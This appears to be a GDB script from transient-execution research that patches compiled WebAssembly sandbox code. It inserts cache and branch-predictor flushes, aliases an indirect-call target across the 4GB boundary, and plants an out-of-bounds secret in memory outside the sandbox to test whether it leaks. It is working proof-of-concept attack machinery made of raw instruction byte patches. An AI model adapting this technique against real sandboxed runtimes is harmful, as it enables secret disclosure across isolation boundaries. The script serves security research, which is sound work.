set pagination off

# load native .so which contains code for copycode()
set $soaddr = (void*) dlopen("./copycode.so", 2)
add-symbol-file "./copycode.so" $soaddr

# get address of fread() and ftrain()
set $freadaddr = (char*) &'guest_func_fread'
set $ftrainaddr = (char*) &'guest_func_ftrain'

# patch noopfunc call to flush
set $flushaddr= $freadaddr + 315
# clflush
print *($flushaddr + 0) = 0x0f
print *($flushaddr + 1) = 0xae
print *($flushaddr + 2) = 0x3d
# rip relative disp
print *($flushaddr + 3) = 0x17
print *($flushaddr + 4) = 0x00
print *($flushaddr + 5) = 0x00
print *($flushaddr + 6) = 0x00
# padding
print *($flushaddr + 7) = 0x66
print *($flushaddr + 8) = 0x0f
print *($flushaddr + 9) = 0x1f
print *($flushaddr + 10) = 0x84
print *($flushaddr + 11) = 0x00
print *($flushaddr + 12) = 0x00
print *($flushaddr + 13) = 0x00
print *($flushaddr + 14) = 0x00
print *($flushaddr + 15) = 0x00

print *($flushaddr + 16) = 0x0f
print *($flushaddr + 17) = 0x1f
print *($flushaddr + 18) = 0x44
print *($flushaddr + 19) = 0x00
print *($flushaddr + 20) = 0x00

# patch the first several instructions to access own memory, to test if the transient execution happens
#set $movaddr= $freadaddr + 235
## mov ebx,0x53000
## mov ebx,ebx
## mov ebx,DWORD PTR [r15+rbx*1]
#p *($movaddr + 0) = 0xbb
#p *($movaddr + 1) = 0x00
#p *($movaddr + 2) = 0x30
#p *($movaddr + 3) = 0x05
#p *($movaddr + 4) = 0x00
#p *($movaddr + 5) = 0x89
#p *($movaddr + 6) = 0xdb
#p *($movaddr + 7) = 0x41
#p *($movaddr + 8) = 0x8b
#p *($movaddr + 9) = 0x1c
#p *($movaddr + 10) = 0x1f
#p *($movaddr + 11) = 0x90
#p *($movaddr + 12) = 0x90
#p *($movaddr + 13) = 0x90
#p *($movaddr + 14) = 0x90

set $doneaddr= $freadaddr + 259
p *($doneaddr + 0) = 0x0f
p *($doneaddr + 1) = 0x0b

#patch the normal execution to access the secret
#48 8b 1c 17  mov    rbx,QWORD PTR [rdi+rdx*1]
set $accessaddr = $freadaddr + 322
p *($accessaddr+0) = 0x48
p *($accessaddr+1) = 0x8b
p *($accessaddr+2) = 0x1c
p *($accessaddr+3) = 0x17
p *($accessaddr+4) = 0x48
p *($accessaddr+5) = 0x8b
p *($accessaddr+6) = 0x1c
p *($accessaddr+7) = 0x24
p *($accessaddr+8) = 0x90
p *($accessaddr+9) = 0x90
p *($accessaddr+10) = 0x90
p *($accessaddr+11) = 0x90
p *($accessaddr+12) = 0x90
p *($accessaddr+13) = 0x90

define add_btb_flushes
  # patch the ftrain to call btb_flush
  set $btb_flush_func = (char*) &'btb_flush'
  set $btbflushaddr = $ftrainaddr + 354
  p *($btbflushaddr+0) = 0x48
  p *($btbflushaddr+1) = 0xbb
  p *($btbflushaddr+2) = (unsigned long long)$btb_flush_func & 0x0000000000ff
  p *($btbflushaddr+3) = ((unsigned long long)$btb_flush_func & 0x00000000ff00) >> 8
  p *($btbflushaddr+4) = ((unsigned long long)$btb_flush_func & 0x000000ff0000) >> 16
  p *($btbflushaddr+5) = ((unsigned long long)$btb_flush_func & 0x0000ff000000) >> 24
  p *($btbflushaddr+6) = ((unsigned long long)$btb_flush_func & 0x00ff00000000) >> 32
  p *($btbflushaddr+7) = ((unsigned long long)$btb_flush_func & 0xff0000000000) >> 40
  p *($btbflushaddr+8) = 0x00
  p *($btbflushaddr+9) = 0x00
  p *($btbflushaddr+10) = 0xff
  p *($btbflushaddr+11) = 0xd3
  p *($btbflushaddr+12) = 0x90
  p *($btbflushaddr+13) = 0x90
  p *($btbflushaddr+14) = 0x90
  p *($btbflushaddr+15) = 0x90
  p *($btbflushaddr+16) = 0x90
  p *($btbflushaddr+17) = 0x90
  p *($btbflushaddr+18) = 0x90
  p *($btbflushaddr+19) = 0x90
  p *($btbflushaddr+20) = 0x90
end

# get address of target function
set $targetaddr = (void*)((uint64_t)$ftrainaddr ^ ((uint64_t)1 << (uint64_t)32))

# call copycode with appropriate arguments
set $ret = (int) copycode($targetaddr, $freadaddr, 1300)

# ensure result was 0
if $ret != 0
print "!!!!!!! Error performing copycode !!!!!!!"
error
end

# patch fread call in wasm indirect function table to use the copied version
set $functable = (char*) &'guest_table_0'
set $functablerow = (char**)($functable + (1 << 4) + 0x8)
p *($functablerow) = $targetaddr

# place oob secret
print (void*) mmap($rdi + 0x100000000, 4096, 0x1 | 0x2 | 0x4, 0x20 | 0x02 | 0x10, -1, 0)
p *($rdi + 0x100000062) = 0x4d
p *($rdi + 0x100000063) = 0x0

# verify ftrain code
# x/128i guest_func_ftrain
# test exfiltrate
# b *($targetaddr + 100)
c
#b *($targetaddr + 227)
#jump *($targetaddr + 227)
#si
#si
#si
#si
#si
#jump *($targetaddr + 100)
#delete breakpoints
# finish
print "END"
quit

#b *($targetaddr + 336)
# c
